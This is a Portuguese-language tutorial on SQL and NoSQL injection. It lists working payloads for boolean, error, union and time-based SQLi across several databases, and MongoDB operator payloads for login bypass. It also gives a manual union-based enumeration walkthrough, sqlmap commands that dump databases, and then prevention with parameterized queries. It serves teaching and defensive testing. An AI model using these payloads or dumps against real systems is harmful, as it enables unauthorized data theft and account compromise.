## 💉 SQL Injection (Injeção de SQL)

A **SQL Injection (SQLi)** é uma vulnerabilidade que ocorre quando uma aplicação utiliza **dados fornecidos pelo usuário na construção de consultas SQL sem realizar o tratamento adequado**.

👉 O atacante consegue manipular a consulta original e fazer o banco de dados interpretar comandos que não faziam parte da intenção original da aplicação.

---

## ⚙️ Como acontece

Imagine uma aplicação que recebe:

```http
GET /cat.php?id=1
```

E o servidor constrói:

```sql
SELECT * FROM products WHERE id = '1';
```

Se a aplicação concatenar diretamente a entrada do usuário:

```text
id = entrada_do_usuario
```

💥 O atacante pode tentar modificar a estrutura da consulta.

---

## 📌 Principais tipos

### 🔹 1. Boolean-Based Blind SQLi

O atacante envia uma condição **verdadeira ou falsa** e observa se o comportamento da aplicação muda.

```sql
' AND 1=1 #
```

```sql
' AND 1=0 #
```

Resultado:

```text
1 = 1 → VERDADEIRO
1 = 0 → FALSO
```

💥 Se as respostas forem diferentes, esse comportamento pode ser utilizado para inferir informações do banco.

---

### 🔹 2. Error-Based SQLi

O atacante provoca um erro no banco e analisa a mensagem retornada.

Exemplo conceitual:

```text
Entrada
   ↓
Consulta SQL
   ↓
Erro
   ↓
Mensagem retornada
```

A mensagem pode revelar:

- SGBD utilizado
- tabelas
- colunas
- consultas
- versões
- informações internas

💥 Mensagens de erro excessivamente detalhadas podem facilitar a exploração.

---

### 🔹 3. Union-Based SQLi

Utiliza o operador `UNION` para combinar o resultado da consulta original com outra consulta.

Exemplo em um laboratório MySQL/MariaDB:

```sql
' UNION SELECT 1,2,3 #
```

Depois de identificar as posições refletidas:

```sql
' UNION SELECT 1,database(),3 #
```

Enumerando tabelas:

```sql
' UNION SELECT 1,group_concat(table_name),3
FROM information_schema.tables
WHERE table_schema=database() #
```

Enumerando colunas:

```sql
' UNION SELECT 1,group_concat(column_name),3
FROM information_schema.columns
WHERE table_name='users' #
```

Consultando dados:

```sql
' UNION SELECT 1,group_concat(username),3
FROM users #
```

💥 Diferentemente da Blind SQLi, a técnica pode fazer os dados aparecerem diretamente na resposta da aplicação.

---

### 🔹 4. Time-Based Blind SQLi

O atacante provoca um **atraso controlado** no banco de dados e utiliza o tempo de resposta para determinar se uma condição é verdadeira ou falsa.

#### MySQL / MariaDB

```sql
' AND SLEEP(5) #
```

Condição verdadeira:

```sql
' AND IF(1=1,SLEEP(5),0) #
```

Condição falsa:

```sql
' AND IF(1=0,SLEEP(5),0) #
```

Resultado:

```text
1 = 1 → demora ~5 segundos
1 = 0 → resposta normal
```

#### PostgreSQL

```sql
' AND pg_sleep(5)--
```

Condicional:

```sql
' AND CASE WHEN 1=1 THEN pg_sleep(5) ELSE NULL END--
```

#### SQL Server

```sql
'; WAITFOR DELAY '00:00:05'--
```

Condicional:

```sql
'; IF 1=1 WAITFOR DELAY '00:00:05'--
```

💥 A técnica pode ser automatizada para fazer perguntas ao banco e reconstruir informações com base nos tempos de resposta.

📌 O payload depende do **SGBD** e da estrutura da consulta original.

---

## 🗃️ NoSQL Injection

**NoSQL Injection** é uma vulnerabilidade semelhante à SQL Injection, mas ocorre em aplicações que utilizam **bancos de dados não relacionais**.

Em vez de manipular uma consulta SQL, o atacante pode tentar manipular **operadores e estruturas utilizadas pelo banco NoSQL**.

### 🔹 MongoDB — operador `$ne`

Em um laboratório autorizado:

```json
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}
```

`$ne` significa:

```text
Not Equal
↓
Diferente de
```

A aplicação pode acabar interpretando:

```text
password != null
```

💥 Se o backend não validar corretamente a entrada, isso pode resultar em bypass de autenticação.

---

### 🔹 Operador `$gt`

```json
{
  "username": "admin",
  "password": {
    "$gt": ""
  }
}
```

`$gt` significa:

```text
Greater Than
↓
Maior que
```

---

### 🔹 Operador `$regex`

```json
{
  "username": {
    "$regex": "^admin"
  }
}
```

Esse operador pode ser utilizado para testar padrões em valores armazenados.

💥 Dependendo da aplicação, operadores como `$regex` podem ser utilizados para inferir informações que deveriam permanecer protegidas.

---

## 🧪 Exploração Manual

Em um laboratório:

```http
https://exemple.com/cat.php?id=1
```

Teste inicial:

```http
https://exemple.com/cat.php?id=1'
```

Descobrindo a quantidade de colunas:

```http
https://exemple.com/cat.php?id=-1 ORDER BY 1
```

```http
https://exemple.com/cat.php?id=-1 ORDER BY 2
```

```http
https://exemple.com/cat.php?id=-1 ORDER BY 3
```

Testando `UNION`:

```http
https://exemple.com/cat.php?id=-1 UNION SELECT 1,2,3
```

Identificando o banco:

```http
https://exemple.com/cat.php?id=-1 UNION SELECT 1,database(),3
```

Enumerando tabelas:

```http
https://exemple.com/cat.php?id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()
```

Enumerando colunas:

```http
https://exemple.com/cat.php?id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'
```

Consultando dados:

```http
https://exemple.com/cat.php?id=-1 UNION SELECT 1,group_concat(username),3 FROM users
```

---

## 🤖 Exploração Automática

Ferramentas como o **sqlmap** podem automatizar a identificação e exploração de SQL Injection.

### 🔹 URL

```bash
sqlmap -u "https://exemple.com/cat.php?id=1"
```

Listar bancos:

```bash
sqlmap -u "https://exemple.com/cat.php?id=1" --dbs
```

Listar tabelas:

```bash
sqlmap -u "https://exemple.com/cat.php?id=1" -D "banco" --tables
```

Listar colunas:

```bash
sqlmap -u "https://exemple.com/cat.php?id=1" -D "banco" -T "tabela" --columns
```

Extrair dados:

```bash
sqlmap -u "https://exemple.com/cat.php?id=1" -D "banco" -T "tabela" -C "name,pass" --dump
```

Extrair tudo:

```bash
sqlmap -u "https://exemple.com/cat.php?id=1" --dump-all
```

### 🔹 Request File

```bash
sqlmap -r request.txt
```

```bash
sqlmap -r request.txt --dbs
```

```bash
sqlmap -r request.txt -D "banco" --tables
```

```bash
sqlmap -r request.txt -D "banco" -T "tabela" --columns
```

```bash
sqlmap -r request.txt -D "banco" -T "tabela" -C "name,pass" --dump
```

---

## 🚨 Impactos

Dependendo dos privilégios da aplicação no banco, uma SQL Injection pode permitir:

- leitura de dados
- alteração de informações
- exclusão de registros
- descoberta da estrutura do banco
- acesso a informações sensíveis
- comprometimento de contas
- bypass de determinadas verificações
- em alguns cenários, comprometimento adicional do servidor

📌 O impacto depende principalmente das **permissões do usuário utilizado pela aplicação no banco de dados**.

---

## 🔐 Como prevenir

A principal defesa é utilizar **consultas parametrizadas (Prepared Statements)**.

❌ Evite:

```python
query = "SELECT * FROM users WHERE id = '" + user_id + "'"
```

✅ Prefira:

```python
query = "SELECT * FROM users WHERE id = ?"
cursor.execute(query, (user_id,))
```

Também é importante:

- utilizar Prepared Statements
- evitar concatenação de SQL
- utilizar ORM corretamente
- validar entradas quando apropriado
- aplicar o princípio do menor privilégio
- evitar mensagens de erro detalhadas
- manter componentes atualizados
- realizar testes de segurança

📌 **Regra de ouro:**

👉 **Dados fornecidos pelo usuário devem ser tratados como dados, nunca como parte da estrutura da consulta SQL.**